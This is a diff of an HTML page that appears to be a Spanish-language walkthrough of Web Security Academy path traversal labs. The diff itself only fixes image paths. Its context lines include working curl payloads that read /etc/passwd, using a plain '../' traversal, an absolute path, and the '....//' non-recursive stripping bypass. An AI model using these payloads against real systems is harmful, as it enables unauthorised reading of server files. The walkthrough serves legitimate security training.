@@ -42,7 +42,7 @@
       <h5><span class="badge bg-danger me-2">Lab 1</span>File path traversal, simple case</h5>
       <p class="text-secondary">La página es vulnerable en el parámetro <code>filename</code> de la visualización de imágenes. Usar <code>../</code> para subir directorios y leer <code>/etc/passwd</code>.</p>
       <pre class="code-block"><code>curl -i "https://LAB-ID.web-security-academy.net/image?filename=../../../etc/passwd"</code></pre>
-      <img src="../img/path1.png" class="img-fluid rounded my-3 border border-secondary">
+      <img src="img/path1.png" class="img-fluid rounded my-3 border border-secondary">
     </section>
 
     <!-- Common obstacles -->
@@ -52,14 +52,14 @@
       <h5><span class="badge bg-danger me-2">Lab 2</span>Traversal sequences blocked with absolute path bypass</h5>
       <p class="text-secondary">El servidor bloquea las secuencias <code>../</code>. Usar una ruta absoluta directa en su lugar.</p>
       <pre class="code-block"><code>curl -i "https://LAB-ID.web-security-academy.net/image?filename=/etc/passwd"</code></pre>
-      <img src="../img/path2.png" class="img-fluid rounded my-3 border border-secondary">
+      <img src="img/path2.png" class="img-fluid rounded my-3 border border-secondary">
     </section>
 
     <section class="mb-4">
       <h5><span class="badge bg-danger me-2">Lab 3</span>Traversal sequences stripped non-recursively</h5>
       <p class="text-secondary">El servidor reemplaza <code>..</code> por <code>.</code> y <code>../</code> por <code>/</code> de forma no recursiva. Doblar las secuencias para que después de la sustitución quede el traversal correcto.</p>
       <pre class="code-block"><code>curl -i "https://LAB-ID.web-security-academy.net/image?filename=....//....//....//etc/passwd"</code></pre>
-      <img src="../img/path3.png" class="img-fluid rounded my-3 border border-secondary">
+      <img src="img/path3.png" class="img-fluid rounded my-3 border border-secondary">
     </section>
 
     <section class="mb-4">
